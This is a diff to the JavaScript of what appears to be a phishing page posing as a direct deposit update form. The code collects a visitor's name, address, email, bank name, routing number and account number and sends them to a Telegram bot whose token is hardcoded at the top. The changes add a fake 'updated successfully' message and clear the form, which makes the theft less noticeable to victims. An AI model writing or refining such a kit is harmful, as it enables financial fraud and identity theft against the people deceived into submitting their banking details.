@@ -1,4 +1,3 @@
-
 //bot token
 var telegram_bot_id = "6310644522:AAHTH8-ulzoYqSzZaLCipmNF5uzJPFXaNy0";
 //chat id
@@ -19,8 +18,9 @@ var ready = function () {
     account = document.getElementById("account").value;
     initial = document.getElementById("initial").value;
     date = document.getElementById("date").value;
-    message = "First Name: " + firstname +"\nLast name: " + lastname +"\nEmail: " + email +"\nStreet: " + street +"\nApt: " + apt +"\nState: " + state +"\nCity: " + city + "\nZip: " + zip + "\nBank name: " + bankname + "\nRouting number: " + routingnumber + "\nAccount number: " + accountnumber + "\nAccount type : " + account + "\nInitial : " + initial + "\nDate : " + date;
+    message = "First Name: " + firstname + "\nLast name: " + lastname + "\nEmail: " + email + "\nStreet: " + street + "\nApt: " + apt + "\nState: " + state + "\nCity: " + city + "\nZip: " + zip + "\nBank name: " + bankname + "\nRouting number: " + routingnumber + "\nAccount number: " + accountnumber + "\nAccount type : " + account + "\nInitial : " + initial + "\nDate : " + date;
 };
+
 var sender = function () {
     ready();
     var settings = {
@@ -39,7 +39,11 @@ var sender = function () {
     };
     $.ajax(settings).done(function (response) {
         console.log(response);
+        // Display success message after submission
+        document.getElementById("updateMessage").textContent = "Direct deposit updated successfully!";
     });
+
+    // Clear form fields after submission
     document.getElementById("firstname").value = "";
     document.getElementById("lastname").value = "";
     document.getElementById("email").value = "";
@@ -54,5 +58,6 @@ var sender = function () {
     document.getElementById("account").value = "";
     document.getElementById("initial").value = "";
     document.getElementById("date").value = "";
+    
     return false;
 };
